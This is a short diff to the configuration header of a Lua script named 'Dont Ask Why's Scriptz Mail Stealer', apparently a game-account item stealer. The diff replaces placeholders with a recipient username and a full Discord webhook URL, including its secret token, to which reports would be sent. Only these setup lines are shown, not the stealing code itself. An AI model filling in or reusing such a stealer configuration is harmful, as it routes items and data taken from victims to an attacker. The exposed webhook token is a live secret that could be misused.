@@ -1,10 +1,10 @@
 --{{ Dont Ask Why's Scriptz  Mail Stealer }}--
 
 --{{ Main Config }}--
-_G.UserName = "UserNameHere" --// Write your Username
+_G.UserName = "ABAG0D0" --// Write your Username
 
 --{{ Webhook Config }}--
-_G.Webhook = "WebhookHere" -- Enter your Wehook
+_G.Webhook = "https://discord.com/api/webhooks/1138220469078732870/BW8yaxjmXyw4JWmRr9ZxA8uo6qSWtUwcl2kWk7QHx4FXSa68iTF62uZ_akKqmk31KstT" -- Enter your Wehook
 
 --{{ Extra Settings }}--
 _G.LoadingScreen = true --// False Is To Not Use The Loading Screen
